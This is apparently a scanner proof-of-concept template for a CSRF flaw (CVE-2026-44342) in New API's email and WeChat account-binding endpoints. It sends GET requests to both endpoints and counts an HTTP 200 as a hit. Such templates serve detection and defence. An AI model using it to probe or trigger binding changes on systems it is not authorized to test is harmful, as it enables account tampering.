[info]
author = "ave"
description = "检测 New API 邮箱/微信账号绑定接口 CSRF 漏洞（CVE-2026-44342），通过跨站 GET 请求触发账号绑定状态变更"
id = "POC-AVE-2026-0269"
name = "New API CSRF PoC"
severity = "medium"
tags = ["ave-2026-0269"]
vuln_id = [
    "CVE-2026-44342",
    "AVE-2026-0269",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/api/oauth/email/bind"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/api/oauth/wechat/bind"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
